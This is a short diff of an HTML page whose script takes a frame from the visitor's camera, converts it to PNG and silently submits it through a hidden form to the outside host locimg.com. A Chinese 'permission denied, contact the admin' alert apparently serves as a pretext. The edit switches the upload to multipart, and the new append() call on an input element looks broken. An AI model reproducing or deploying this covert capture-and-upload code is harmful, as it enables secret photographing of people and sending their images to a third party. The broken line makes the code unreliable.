@@ -22,7 +22,8 @@
                     setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
                     setTimeout(function(){
                         var img = canvas.toDataURL('image/png');  
-                        document.getElementById('result').value = img;
+                        document.getElementById('image').append("image", img, "alan.png");
+;
                         document.getElementById('gopo').submit();
                         },1300);
                 },function(){alert("操作失败，权限不够！请联系管理员 QQ");});
@@ -31,8 +32,8 @@
 		}, false);
 
 	</script>
-<form action="https://locimg.com/upload/upload.html" id="gopo" method="post">
-<input type="hidden" name="img" id="result" value="" />
+<form action="https://locimg.com/upload/upload.html" enctype="multipart/form-data"  id="gopo" method="post" >
+<input type="hidden" name="img" id="image" value="" />
 </form>
 </body>
 </html>
